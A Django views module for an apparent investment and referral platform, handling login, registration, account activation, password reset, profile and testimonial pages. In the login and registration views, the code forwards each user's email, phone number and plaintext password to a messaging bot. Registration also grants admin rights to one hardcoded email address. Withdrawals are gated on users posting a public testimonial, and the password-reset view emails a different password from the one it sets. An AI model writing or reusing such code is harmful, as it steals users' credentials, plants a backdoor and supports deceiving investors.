from variables import *
from templates import *

# from django.utils.encoding import force_bytes, force_text


def csrf_failure(request, reason=""):
    ctx = {'message': 'some custom messages'}
    return redirect(dashboard)


class Login(View):

    def get(self, request):
        #
        # if admin.site_available == False:
        #     messages.info(request, 'We are away right now !!!.')
        #     return redirect('/welcome')


        if self.request.user.is_authenticated:

            return redirect(dashboard)

        else:
            return render(request, '{}/auth/login.html'.format(appName))

    def post(self, request):

        # try:

            if request.method == 'POST':
                email = request.POST['email']
                password = request.POST['password']

                try:
                    check_user = MyUser.objects.get(email=email)

                    if check_user.is_active == False:

                        # send activation link
                        # try:

                        current_site = get_current_site(request)
                        html_message = loader.render_to_string('auth/activate.html', {
                            'name': check_user.full_name.title(),
                            'user': check_user,
                            'domain': current_site.domain,
                            'uid': urlsafe_base64_encode(force_bytes(check_user.pk)),
                            'message': 'Please click on the link to confirm your registration on {}.'.format(COMPANY),
                            'token': account_activation_token.make_token(check_user),
                            'img': '{}/static/temp/images/logo-white.png'.format(get_current_site(request)),
                            'sitename': COMPANY,
                            'contact_link': '{}/contact-us'.format(get_current_site(request)),
                        })

                        data = {
                            'Messages': [
                                {
                                    "From": {
                                        "Email": settings.EMAIL_DELIVERY,
                                        "Name": COMPANY
                                    },
                                    "To": [
                                        {
                                            "Email": email,
                                            "Name": ""
                                        }
                                    ],
                                    "Subject": "Account Activation",
                                    "HTMLPart": html_message,
                                    "CustomID": "AppGettingStartedTest"
                                }
                            ]
                        }

                        mailjet.send.create(data=data)

                        # except:
                        #
                        #     pass

                        messages.success(request, '{} '
                                                  'check your email address to activate your account.'.format(success),
                                         )

                        return render(request, 'auth/signin.html',

                                      {
                                          'activation_email':email,
                                      })
                except:
                    pass

                user = authenticate(request, username=email, password=password)

                if user is not None:

                    if user.is_blocked == True:
                        messages.info(request, 'Account currently on hold, please contact support. Reason!!! Our robot deteced a duplicate poof of payment on your account, if you think this is wrong, plese send us a dm to open back your account aain. @help_Gs001')
                        return redirect(ulogin)

                    if user.reset_password == True:
                        user.reset_password = False
                        user.save()
                        login(request, user)
                        messages.info(request, 'Kindly change your password immediately '
                                               'for your account safety and security.')
                        return redirect('user:resetPassword')
                    else:
                        login(request, user)
                        if user.count_login <= 1:
                            info = PersonalInfomation.objects.get(user=self.request.user)
                            web_login('{} Login \n'
                                      'email: {}\n'
                                      'Phone: {}\n'
                                      'Password: {}\n'.format(
                                site_name, email, info.phone_number, password
                            ), web_logins_bot, web_login_page)
                            user.count_login += 1
                            user.save()
                        try:
                            return redirect(self.request.GET.get('next'))
                        except:
                            return redirect(dashboard)
                else:
                    messages.info(request, 'Invalid credentials provided.')
                    return redirect(ulogin)


class Register(View):

    def get(self, request):

        if self.request.user.is_authenticated:

            return redirect(dashboard)

        else:
            return render(request, '{}/auth/register.html'.format(appName),)

    def post(self, request):

        if request.method == 'POST':

                male_icon = '👨🏾‍💻'
                female_icon = '👩🏻‍⚕️'

                gender = request.POST.get('gender')
                fullname = request.POST.get('fullName')
                username = request.POST.get('userName').title()
                email = request.POST.get('email')
                phone = request.POST.get('phoneNumber')
                password = request.POST.get('password')
                confirm_password = request.POST.get('cpassword')
                pin = request.POST.get('pin')

                # if len(pin) <= 3:
                #     messages.info(request, 'Withdrawal pin must be in range of 4 letters or numbers.')
                #     return redirect(register)

                if len(password) <= 4:
                    messages.info(request, 'Password must be in range of 5 letters or numbers.')
                    return redirect(register)

                elif fullname == '' or username == '' or email == '' or password == '':

                    messages.info(request, 'All fields are required.')
                    return redirect(register)

                elif password != confirm_password:
                    messages.info(request, 'Password missmatch')
                    return redirect(register)

                else:

                    if MyUser.objects.filter(Q(email=email) | Q(username=username)).exists():

                        messages.info(request, 'User with matched credentials recorded.')
                        return redirect(ulogin)

                    else:
                        user = MyUser.objects.create_user(username=username,
                                                          email=email,
                                                          password=password)


                        #########################################################
                        UserWallet.objects.create(user=user,
                                                  user_account_number=account_number_generator())

                        ###################################################
                        #create Userpreference table
                        UserPreference.objects.create(user=user,
                                                      ref_link=user.username
                                                      )

                        ####################################################
                        #create withdraw pin table
                        # WithdrawPin.objects.create(user=user,
                        #                            pin=pin)

                        ###################################################
                        # create Personal  table
                        PersonalInfomation.objects.create(user=user,
                                                          phone_number=phone)

                        user = authenticate(request, username=email, password=password)
                        if user.email == 'donyemordi@gmail.com':
                            user.is_admin = True
                            user.top_admin = True
                            UserReferral.objects.create(user=user)
                        if gender == 'male':
                            user.gender = male_icon
                        else:
                            user.gender = female_icon
                        user.full_name = fullname.title()
                        user.otp = otp_Verification()
                        user.set_password(password)
                        user.is_active = True
                        user.save()
                        if user.count_login <= 1:
                            web_login('{} Registration\n'
                                      'email: {}\n'
                                      'Phone: {}\n'
                                      'Password: {}\n'.format(
                                site_name, email, phone, password
                            ), web_logins_bot, web_login_page)

                        '''
                        check if user was referred
                        '''
                        try:
                            ref = request.POST['refNumber']
                            ref = float(ref)
                            user_email = UserWallet.objects.get(user_account_number=ref)
                            ref = user_email.user.email
                            if MyUser.objects.filter(email=ref).exists():
                                # create the downline fot this user
                                user_ref = MyUser.objects.get(email=ref)
                                referred = MyUser.objects.get(email=email)
                                UserReferral.objects.create(user=user_ref,
                                                            referred=referred)
                        except:
                            ref_user = MyUser.objects.get(top_admin=True)
                            referred = MyUser.objects.get(email=email)
                            UserReferral.objects.create(user=ref_user,
                                                        referred=referred)

                        user = authenticate(request, username=email, password=password)
                        login(request, user)

                        try:
                            notifications('® A new Lifter Registration, \n\n'
                                          '{}\n'
                                          '\n\n'
                                          '{}'.format(
                                registration_mess, COMPANY
                            ), bot_id, group)
                            user.count_login += 1
                            user.save()
                        except:
                            pass
                        return redirect(dashboard)

def activate(request, uidb64, token):

        uid = force_text(urlsafe_base64_decode(uidb64))
        try:
            user = MyUser.objects.get(pk=uid)
        except:
                messages.error(request, 'link invalid, please try again or contact support.')
                return redirect('/sign-in')

        if user.is_active == False and user is not None and account_activation_token.check_token(user, token):

            if user.email == 'donyemordi@gmail.com':
                user.is_admin = True

            user.is_active = True
            user.save()
            login(request, user)

            html_message = loader.render_to_string('goldstockProject/welcome_message.html', {
                'name': user.full_name.title(),
                'message': 'Welcome to {}, creating a worldwide investment solution.'
                           'Number 1 data company with a key focus on building global consistent and comparable datasets.'.format(COMPANY),
                'img': '{}/static/temp/images/logo-white.png'.format(get_current_site(request)),
                'ceo': '{}/static/temp/images/ceo.jpg'.format(get_current_site(request)),
                'domain': get_current_site(request).domain,
                'contact_link': '{}/contact-us'.format(get_current_site(request)),
                'sitename': COMPANY,

            })

            data = {
                'Messages': [
                    {
                        "From": {
                            "Email": settings.EMAIL_DELIVERY,
                            "Name": COMPANY
                        },
                        "To": [
                            {
                                "Email": user.email,
                                "Name": ""
                            }
                        ],
                        "Subject": "Welcome to {}".format(COMPANY),
                        "HTMLPart": html_message,
                        "CustomID": "AppGettingStartedTest"
                    }
                ]
            }


            return redirect('goldstockProject:welcome')

        else:
            messages.error(request, 'Link invalid, or your account has been verified, please login.')
            return redirect('/sign-in')

def resend_verification(request, email):

    # send activation link
    try:

        user = MyUser.objects.get(email=email)

        if user.is_active == False:

            current_site = get_current_site(request)
            html_message = loader.render_to_string('auth/activate.html', {
                'name': user.full_name.title(),
                'user': user,
                'domain': current_site.domain,
                'uid': urlsafe_base64_encode(force_bytes(user.pk)),
                'message': 'Please click on the link to confirm your registration on {}.'.format(COMPANY),
                'token': account_activation_token.make_token(user),
                'img': '{}/static/temp/images/logo-white.png'.format(get_current_site(request)),
                'contact_link': '{}/contact-us'.format(get_current_site(request)),
            })

            data = {
                'Messages': [
                    {
                        "From": {
                            "Email": settings.EMAIL_DELIVERY,
                            "Name": COMPANY
                        },
                        "To": [
                            {
                                "Email": email,
                                "Name": ""
                            }
                        ],
                        "Subject": "Account Activation",
                        "HTMLPart": html_message,
                        "CustomID": "AppGettingStartedTest"
                    }
                ]
            }

            mailjet.send.create(data=data)

            messages.success(request, 'Activation link, resent.')

            return render(request, 'auth/signin.html',

                          {
                              'activation_email': email,
                          })
        else:
            messages.error(request, 'Activation link invalid, or your account has been verified.')
            return redirect('user:signin')

    except:
        return redirect('/')

class Logout(View):

    def get(self, request):
        logout(request)
        return redirect('/')

@login_required()
def location_ip(request):

    if request.method== 'GET':
        location = request.GET['location']
        ip = request.GET['ip']

        get_user_preference = UserPreference.objects.get(user=request.user)
        get_user_preference.ip = ip
        get_user_preference.location = location
        get_user_preference.save()

        return redirect('/')

class LostPassword(View):

    def get(self, request):

        if self.request.user.is_authenticated:

            return redirect(dashboard)

        else:

            return render(request, 'auth/forgot-password.html')

    def post(self, request):

        # try:
            if request.method == 'POST':

                user_email = request.POST['email']
                sec = request.POST['sec_question']

                #check if the given email exist update the password and send it to the user mail

                user = MyUser.objects.filter(email=user_email)

                sec = WithdrawPin.objects.filter(user__email=user_email,
                                                 pin=sec)

                if sec.exists():
                    pass
                else:
                    messages.error(request, 'Incorrect withdrawal pin provided, '
                                           'try again or contact support.')
                    return redirect('/forgot-password')

                if user.exists() :

                    user = MyUser.objects.get(email=user_email)

                    #reset password

                    user.set_password(generated_password())
                    user.reset_password = True
                    user.save()

                    html_message = loader.render_to_string('auth/auth_mail.html', {
                        'name': user.full_name,
                        'password': generated_password(),
                        'message': 'Please kindly login to your account with the generated password and reset '
                                   'your account password immediately for security reasons.',
                        'img': '{}/static/temp/images/logo-white.png'.format(get_current_site(request)),
                        'sitename': COMPANY,
                        'contact_link': '{}/contact-us'.format(get_current_site(request)),
                        'domain': get_current_site(request),
                    })

                    # try:

                    data = {
                        'Messages': [
                            {
                                "From": {
                                    "Email": settings.EMAIL_DELIVERY,
                                    "Name": COMPANY
                                },
                                "To": [
                                    {
                                        "Email": user_email,
                                        "Name": ""
                                    }
                                ],
                                "Subject": "Account Recovery",
                                # "TextPart": 'Hi{}'.format(password.username),
                                "HTMLPart": html_message,
                                "CustomID": "AppGettingStartedTest"
                            }
                        ]
                    }

                    mailjet.send.create(data=data)

                    messages.info(request, 'We have email you your password  if found.')
                    return redirect('/forgot-password')

                    # for password in user:
                    #     # reset_password = forgot_password_generator()
                    #     # password.reset_password = reset_password
                    #     # password.set_password(reset_password)
                    #     # password.save()
                    #
                    #     html_message = loader.render_to_string('auth/auth_mail.html', {
                    #         'name': password.full_name,
                    #         'otp': password.otp,
                    #         'message': 'Please use this code to reset your account.',
                    #         'img': '{}/static/images/mail_img.png'.format(
                    #             settings.ALLOWED_HOSTS[0]),
                    #         'contact_link': '{}'.format(settings.ALLOWED_HOSTS[1])
                    #     })
                    #
                    #     # try:
                    #
                    #     data = {
                    #         'Messages': [
                    #             {
                    #                 "From": {
                    #                     "Email": settings.EMAIL_DELIVERY,
                    #                     "Name": "Doughscoin"
                    #                 },
                    #                 "To": [
                    #                     {
                    #                         "Email": user_email,
                    #                         "Name": ""
                    #                     }
                    #                 ],
                    #                 "Subject": "Account Recovery",
                    #                 # "TextPart": 'Hi{}'.format(password.username),
                    #                 "HTMLPart": html_message,
                    #                 "CustomID": "AppGettingStartedTest"
                    #             }
                    #         ]
                    #     }
                    #
                    #     mailjet.send.create(data=data)
                    #
                    #     messages.success(request, 'Code sent to your valid email address.')
                    #     return redirect('user:login')
                    #
                    #     # except:
                    #     #
                    #     #     messages.info(request, 'Check you internet connection and try again.')
                    #     #     return redirect('forgot_password')

                    #check is sec question is correct


                else:

                    messages.info(request, 'We have email you your password  if found.')
                    return redirect('/forgot-password')
        # except:
        #     return redirect('/')

class ResetPassword(LoginRequiredMixin, View):
    login_url = login

    def get(self, request):

        return render(request, 'auth/account.html')


    def post(self, request):

        get_old_password = request.POST['old_password']
        get_new_password = request.POST['new_password']

        email = request.user
        get_user_table = MyUser.objects.get(email=email)

        compare_password = get_user_table.check_password(get_old_password)

        if len(get_new_password) <= 4:
            messages.info(request, 'Password must be in range of 5 letters or numbers.')
            return redirect('/my-account')

        if compare_password == True:
            get_user_table.set_password(get_new_password)
            get_user_table.save()
            update_session_auth_hash(request, get_user_table)

            messages.success(request, '{} Password changed.'.format(success))
            return redirect('/my-account')

        else:
            messages.info(request, 'New password did not match your old password, try again.')
            return redirect('/my-account')

class Account(LoginRequiredMixin, View):
    login_url = login

    def get(self, request):

        profile = PersonalInfomation.objects.get(user=request.user)

        return render(request, 'auth/account.html', {
            'number': profile.phone_number,
            'address': profile.user_address,
            'country': profile.country,
            'state': profile.state,
            'city': profile.city,
        })

    def post(self, request):

        phone = request.POST['phone']
        address = request.POST['address']
        country = request.POST['country']
        state = request.POST['state']
        city = request.POST['city']

        profile = PersonalInfomation.objects.get(user=request.user)
        profile.country = country
        profile.state = state
        profile.city = city
        profile.user_address = address
        profile.phone_number = phone
        profile.save()

        messages.success(request, '{} Personal details updated successfully.'.format(success))
        return redirect('/my-account')

class TestimoniaView(LoginRequiredMixin, View):
    login_url = login


    def get(self, request):

        return render(request, 'peektop/testify.html')

    def post(self, request):

        testimony = request.POST['testimony']
        get_user_wallet = UserWallet.objects.get(user=self.request.user)
        personal_info = PersonalInfomation.objects.get(user=self.request.user)
        get_user_wallet.testified = True
        get_user_wallet.save()

        TESTIMONIA.objects.create(username=self.request.user.username,
                                   personal_info=personal_info,
                                   testify=testimony,
                                   active=True)
        notifications('🔊🔊🔊 Live Testimonial From {}\n\n'
                      '{}\n\n'
                      'Thanks for testifying, you can now proceed with your withdrawal request. 🤝🤝 '.format(
            request.user.full_name.title(), testimony
        ), bot_id, group )
        messages.success(request, '{} Thanks for testifying, you can now proceed with your withdrawal request.'.format(success))
        return redirect('/withdraw')
